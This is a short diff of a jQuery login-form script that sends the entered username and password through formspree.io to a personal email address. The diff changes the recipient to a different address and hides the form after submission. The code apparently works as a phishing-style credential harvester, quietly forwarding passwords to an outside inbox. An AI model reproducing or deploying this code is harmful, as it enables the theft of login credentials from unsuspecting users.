@@ -1,4 +1,3 @@
-/*
 $().ready(function(){
 
     $("#MyForm").validate({
@@ -37,31 +36,24 @@ $().ready(function(){
 
     });
 
-});*/
+});
 $(function() {
-   
     $("#submit").click(function(e) {
         e.preventDefault();
         $.ajax({
-            url: "https://formspree.io/natalia9rokicka@gmail.com",
+            url: "https://formspree.io/korali1@i.ua",
             method: "POST",
             data: {
-                username: $("#username").val(),
-                pswd: $("#pswd").val(),
+                name: $("#username").val(),
+                password: $("#pswd").val(),
             },
             dataType: "json"
         })
         .done(function(data){
-            $("#wrapper").remove();
+             $("#wrapper").fadeToggle(500);
         });
         
     });
     
 });
-/*
-$(function() {
-    $("#submit").click(function() {
-        $("#wrapper").fadeToggle(500);
-    });
-});*/
 
